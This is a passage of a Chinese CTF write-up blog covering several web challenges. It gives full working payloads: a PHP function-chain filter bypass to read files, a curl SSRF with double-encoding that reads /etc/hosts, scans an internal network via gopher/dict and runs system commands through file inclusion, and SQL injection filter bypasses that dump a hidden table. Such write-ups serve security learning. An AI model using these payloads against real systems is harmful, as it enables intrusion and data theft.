</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>根据过滤函数，它不能使用local，get，set，readfile相关的函数，所以想着是先构造一个 <code>.</code> 或 <code>/</code> 来使用scandir来获取文件。</p> <p>通过chr和ord以及crypt函数配合生成一个. <code>chr(ord(strrev(crypt(serialize(array())))))</code></p> <p>然后通过与end, chdir配合，切换到上一目录，访问根目录的index.php。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>再次构造一个.和scandir，读取最后一个文件index.php，并通过next和file配合读取文件第二行，即可拿到flag。最后的payload是：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>因为.是随机生成的，所以有一定概率不会一次成功，需要多次尝试正好对上了两个.生成就好了。</p> <h2 id="babyt5"><a href="#babyt5" class="header-anchor">#</a> babyt5</h2> <p>原题，参考<a href="https://blog.szfszf.top/tech/%E5%AE%89%E6%81%92%E6%9D%AF6%E6%9C%88%E8%B5%9B-easypentest/" target="_blank" rel="noopener noreferrer">安恒杯6月赛web2 easypentest<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;denied&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$x</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>一个很直白的curl ssrf，由于使用了curl，可以产生一个二次编码问题，通过将p编码为%2570可以绕过。</p> <p>读取<code>file:///var/www/html/flag.%2570hp</code>可以看到源码，提示我查看<code>/etc/hosts</code></p> <p>读取<code>file:///etc/hosts</code>发现最后一行为<code>172.18.0.3 1a59decff560</code>，意味着存在内网。</p> <p>可以使用gopher协议扫描内网，得到<code>172.18.0.2</code>开放80端口，连上去是一个php<code>include $_GET[a];</code>，再使用dict协议扫描端口，发现在25端口有一个SMTP。</p> <p>结合之前的文件包含，可以读取到本地文件，读取邮件储存<code>/var/mail/www-data</code>，发现已经有人写好了木马，直接构造<code>?x=http://172.18.0.2?a=/var/mail/www-data%261=system(&quot;ls%2520/&quot;);</code></p> <p>看到还有一种解法是将木马写入日志，然后php包含日志</p> <p>可以看到根目录的Th7s_Is_Flag文件，读取得到flag{add386bb8e04d516c1e33d91cb939fbf}</p> <h2 id="easysql"><a href="#easysql" class="header-anchor">#</a> easysql</h2> <p>上来就是一个sql注入，测试一下发现过滤了<code>逗号，or，union select</code></p> <p>尝试用<code>union/**/select</code>绕过注入，可以成功。使用<code>SELECT * FROM (select 1)a1 JOIN (select 2)a2</code>的方法绕过逗号过滤产生多个列。</p> <p>过滤or真是特别讨厌，连着<code>order by</code>,<code>information_schema</code>一起报废，仔细搜索一番查到<code>mysql.innodb_table_stats</code>也有表名</p> <table><thead><tr><th style="text-align:left;">列名</th> <th style="text-align:left;">描述</th></tr></thead> <tbody><tr><td style="text-align:left;">database_name</td> <td style="text-align:left;">数据库名</td></tr> <tr><td style="text-align:left;">table_name</td> <td style="text-align:left;">表名</td></tr> <tr><td style="text-align:left;">last_update</td> <td style="text-align:left;">更新时间</td></tr> <tr><td style="text-align:left;">n_rows</td> <td style="text-align:left;">行数</td></tr> <tr><td style="text-align:left;">clustered_index_size</td> <td style="text-align:left;">索引大小</td></tr> <tr><td style="text-align:left;">sum_of_other_index_sizes</td> <td style="text-align:left;">其他索引大小</td></tr></tbody></table> <p>注入语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>可以查到两张表：article,fl111aa44a99g，很明显fl111aa44a99g就是我们的目标
但是我们不知道列名，没关系，同样可以使用<code>SELECT * FROM (select 1)a1 JOIN (select 2)a2 UNION SELECT * FROM &lt;table&gt;</code>的方法在不知道列名的情况下查询数据</p> <p>到这部的时候被坑了好久，</p> <ol><li>是题目的mysql是5.6，跟我测试时的5.7有一点细小的语法差异，最后我拉了一个5.6的docker才发现了这个问题</li> <li>是我在注的时候经常忘记join</li></ol> <p>最后试了好久才调通这个payload</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a1 <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>a2 <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>a3 <span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> fl111aa44a99g <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token punctuation">)</span>e<span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="unlimited-base64-works"><a href="#unlimited-base64-works" class="header-anchor">#</a> Unlimited Base64 Works</h2> <p>未做出，一个视频2千多帧，队友人肉OCR手动输了一天，得出来一个base64，解开一个损坏的图片，又开始拼图，拼了一晚没拼出来，他说要打死出题人</p> <h2 id="无线安全"><a href="#无线安全" class="header-anchor">#</a> 无线安全</h2> <p>未做出，大概的过程是</p> <p>有一个wep的握手包，可以直接用aircrack-ng爆破出来密码yeahUKn0wW3Pp
流量包里是一个adb流量，发送了一个apk出去，处理一番之后能把apk提取出来（队友处理的，细节不太清楚，好像每个包还有去掉头部）
apk反编译之后是一个aes/fcb的加密，怀疑之前那么wep密码能解密，但是最后也没做出来</p> <h2 id="诚聘pwn师傅"><a href="#诚聘pwn师傅" class="header-anchor">#</a> 诚聘PWN师傅</h2> <p>尬笑</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/10.6818eed9.js" defer></script>
  </body>
</html>
